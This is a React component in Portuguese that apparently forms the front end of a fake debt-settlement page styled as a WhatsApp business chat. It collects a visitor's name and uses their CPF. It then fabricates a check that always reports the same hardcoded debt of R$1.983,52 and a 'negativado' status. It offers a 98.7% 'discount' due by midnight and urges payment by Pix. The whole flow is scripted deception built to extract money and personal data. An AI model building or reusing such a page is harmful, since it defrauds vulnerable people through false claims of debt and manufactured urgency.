import React, { useEffect, useRef, useState } from 'react';
import {
    ContentWrapper,
    InformativeCommercialAccount,
    MessageWhatsapp, ErrorMessage

} from './styled';
import { AppContext } from '../../../contexts/AppContext';
import { useContext } from 'react';
import { format } from 'date-fns';
import { CheckComponent, WelcomeMessage, Modal } from './subComponents';
import smoothscroll from 'smoothscroll-polyfill';
smoothscroll.polyfill();

const ContentForm = () => {
    const [nomeCompleto, setNomeCompleto] = useState('');
    const [mostrarInput, setMostrarInput] = useState(true);
    const [mostrarBoasVindas, setMostrarBoasVindas] = useState(false);
    const [showConsultingData, setShowConsultingData] = useState(false);
    const [isNameTouched, setIsNameTouched] = useState(false);
    const [formattedDate, setFormattedDate] = useState('');
    const [showFirstMessage, setShowFirstMessage] = useState(false);
    const [showSecondMessage, setShowSecondMessage] = useState(false);
    const [showThirdMessage, setShowThirdMessage] = useState(false);
    const [showFourthMessage, setShowFourthMessage] = useState(false);
    const [showFifthMessage, setShowFifthMessage] = useState(false);
    const [showSixthMessage, setShowSixthMessage] = useState(false);
    const [showSeventhMessage, setShowSeventhMessage] = useState(false);
    const { globalCPF, loading, setLoading, setWriting, setModal, showModal } = useContext(AppContext);
    const contentWrapperRef = useRef();

    const scrollToBottom = () => {
        const scrollHeight = document.body.scrollHeight;
        const startTime = performance.now();

        return new Promise((resolve) => {
            const animateScroll = (currentTime) => {
                const elapsed = currentTime - startTime;

                window.scroll(0, easeInOut(elapsed, 0, scrollHeight, 1000));

                if (elapsed < 1000) {
                    requestAnimationFrame(animateScroll);
                } else {
                    resolve();
                }
            };

            requestAnimationFrame(animateScroll);
        });
    };
    const easeInOut = (t, b, c, d) => {
        t /= d / 2;
        if (t < 1) return (c / 2) * t * t + b;
        t--;
        return (-c / 2) * (t * (t - 2) - 1) + b;
    };
    const delayAndScroll = async (delayTime) => {
        await delay(delayTime);
        await scrollToBottom();
        setWriting(false);
    };

    useEffect(() => {
        const currentDate = new Date();
        currentDate.setHours(23, 59, 59, 999); // Define a hora para meia-noite

        const formattedString = format(currentDate, "dd/MM/yy (HH:mm)");

        setFormattedDate(formattedString);
    }, []);
    useEffect(() => {
        contentWrapperRef.current.scrollIntoView({ behavior: 'smooth' });
    }, [showConsultingData, setWriting, setLoading, loading]);
    useEffect(() => {
        const writeMessages = async () => {
            setWriting(true);

            await delay(2000);

            setWriting(false);


            setShowFirstMessage(true);

            await delay(1000);

            setWriting(true);

            await delay(1000);

            setWriting(false);
            setShowSecondMessage(true);
        };

        writeMessages();
    }, [setLoading, setWriting]);
    useEffect(() => {
        if (showConsultingData) {
            setWriting(true);
            delay(2000).then(() => {
                setShowThirdMessage(true);
                setWriting(false);


            });
        }
    }, [showConsultingData, setWriting, setLoading, loading]);

    const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

    const handleNomeCompletoChange = (novoNome) => {
        setNomeCompleto(novoNome);
    };

    const handleEnviarClick = () => {

        if (nomeCompleto.trim() === '') {
            setIsNameTouched(true);
        }
        else {
            setWriting(true);
            delay(1500).then(() => {
                setWriting(false);
                setMostrarInput(false);
                setMostrarBoasVindas(true);

                delay(1000).then(() => {
                    setWriting(true);
                });

                delay(2000).then(() => {
                    setWriting(false);
                    setShowConsultingData(true);
                });
            });
        }

    };

    return (
        <ContentWrapper ref={contentWrapperRef}>
            <InformativeCommercialAccount>
                <div>
                    <svg
                        width="24px"
                        height="24px"
                        viewBox="0 0 24 24"
                        fill="none"
                        xmlns="http://www.w3.org/2000/svg"
                    >
                        <path
                            fill="#4b5e63"
                            fillRule="evenodd"
                            clipRule="evenodd"
                            d="M22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12ZM12 17.75C12.4142 17.75 12.75 17.4142 12.75 17V11C12.75 10.5858 12.4142 10.25 12 10.25C11.5858 10.25 11.25 10.5858 11.25 11V17C11.25 17.4142 11.5858 17.75 12 17.75ZM12 7C12.5523 7 13 7.44772 13 8C13 8.55228 12.5523 9 12 9C11.4477 9 11 8.55228 11 8C11 7.44772 11.4477 7 12 7Z"
                        ></path>
                    </svg>
                </div>
                <p style={{ color: '#53676b', fontSize: '14px' }}>
                    Esta é uma conta comercial e não recebe ligações
                </p>
            </InformativeCommercialAccount>

            {showFirstMessage && (
                <MessageWhatsapp>

                    <span>Aguarde enquanto acessamos sua conta...</span>

                    <CheckComponent />
                </MessageWhatsapp>
            )}

            {mostrarInput && showSecondMessage && !mostrarBoasVindas ? (
                <>
                    <p style={{ color: '#53676b', fontSize: '14px', marginTop: '10px', marginLeft: '8px' }}>Digite seu nome completo</p>
                    <div style={{ display: 'flex' }}>
                        <input
                            type="text"
                            style={{
                                borderRadius: "10px",
                                width: "80%",
                                outline: "none",
                                border: "none",
                                boxShadow: " 0 0 2px 1px rgba(0, 0, 0, 0.1)",
                            }}
                            value={nomeCompleto}
                            onChange={(e) => handleNomeCompletoChange(e.target.value)}
                        />
                        <div onClick={handleEnviarClick} style={{ marginLeft: '8px' }}>
                            <svg viewBox="0 0 24 24" height="24" width="24" preserveAspectRatio="xMidYMid meet" version="1.1" x="0px" y="0px" enableBackground="new 0 0 24 24"><title>send</title><path fill="#005e54" d="M1.101,21.757L23.8,12.028L1.101,2.3l0.011,7.912l13.623,1.816L1.112,13.845 L1.101,21.757z"></path></svg>
                        </div>
                    </div>
                    {isNameTouched && nomeCompleto.trim() === '' && <ErrorMessage>Nome é obrigatório</ErrorMessage>}


                </>
            ) : (
                mostrarBoasVindas && <WelcomeMessage nomeCompleto={nomeCompleto} />
            )
            }

            {
                showConsultingData && (
                    <MessageWhatsapp>
                        <span>Consultando dados do CPF: {globalCPF}</span>
                        <CheckComponent />
                    </MessageWhatsapp>
                )
            }

            {
                showThirdMessage && (
                    <>
                        <MessageWhatsapp>
                            <p>
                                {nomeCompleto}, identificamos <b>dívidas</b> ativas em nosso sistema.
                            </p>
                            <br />

                            <p>Seu CPF está associado a uma dívida de R$1.983,52.</p>
                            <br />
                            <p>Situação para CPF {globalCPF}:</p>
                            <p>
                                <b>NEGATIVADO.</b>
                            </p>
                            <CheckComponent />
                        </MessageWhatsapp>
                        <button
                            onClick={() => {
                                if (!showFourthMessage) {
                                    setWriting(true);
                                    delay(1500).then(async () => {

                                        setShowFourthMessage(true)
                                        delay(500).then(async () => {
                                            await delayAndScroll(200);
                                        })
                                        delay(2000).then(async () => {


                                            setWriting(true);
                                            setShowFifthMessage(true);
                                            await delayAndScroll(200);

                                            delay(2000).then(async () => {

                                                setWriting(false);
                                                await delayAndScroll(200);
                                                setShowSixthMessage(true);
                                                delay(500).then(async () => {
                                                    setWriting(true)
                                                    setShowSeventhMessage(true);
                                                    await delayAndScroll(200);

                                                })
                                            });

                                        });

                                    });
                                }
                            }}
                            style={{
                                border: 'none',
                                background: '#005e54',
                                color: '#fff',
                                borderRadius: '10px',
                                padding: '6px 16px',
                                marginTop: '10px'
                            }}
                        >
                            Visualizar acordos
                        </button>
                    </>
                )
            }

            {
                showFourthMessage && (
                    <MessageWhatsapp>
                        <span>Aguarde enquanto verificamos se há acordos disponíveis para você.</span>
                        <CheckComponent />
                    </MessageWhatsapp>
                )
            }

            {
                showFifthMessage && (
                    <>
                        <MessageWhatsapp>
                            <span>Acessando o acordo 98P40GR3550...</span>
                            <CheckComponent />
                        </MessageWhatsapp>
                    </>
                )
            }

            {
                showSixthMessage && (
                    <>
                        <MessageWhatsapp>

                            <div>
                                <p>Informações de acordo <b>98P40GR3550</b> para {nomeCompleto}, (CPF: {globalCPF}):</p>
                                <p>Acordo: <b>98P40GR3550</b></p>
                                <p>Valor Total da Dívida: <b>R$ 1.983,52</b></p>
                                <p>Valor do Contrato: <b>R$ 152,83</b></p>
                                <p>Desconto Total: <b>98,7% (R$ {(1983.52 - 152.83).toFixed(2)})</b></p>
                                <p>Data de Vencimento: {formattedDate}</p>
                                <p>O contrato atual é válido apenas para o titular: <b>{nomeCompleto}</b>, portador(a) do CPF <b>{globalCPF}</b>.</p>
                            </div>

                            <CheckComponent />
                        </MessageWhatsapp>
                    </>
                )
            }

            {
                showSeventhMessage && (
                    <>
                        <MessageWhatsapp>
                            Você deseja quitar sua dívida de R$1.983,52 pelo valor de R$ 152,83?
                        </MessageWhatsapp>
                        <button
                            style={{
                                border: 'none',
                                background: '#005e54',
                                color: '#fff',
                                borderRadius: '10px',
                                padding: '6px 16px',
                                marginTop: '10px'
                            }}
                            onClick={() => {
                                delay(500).then(() => {
                                    setModal(true);
                                    setLoading(loading);

                                })
                            }}
                        >
                            Negociar
                        </button>
                        <MessageWhatsapp>

                            Aproveite! Você também pode pagar via Pix e limpar seu nome em até 48 horas. 💸✨

                        </MessageWhatsapp>

                    </>
                )
            }

            {
                showModal && (

                    <Modal />

                )
            }

        </ContentWrapper >
    );
};


export default ContentForm;
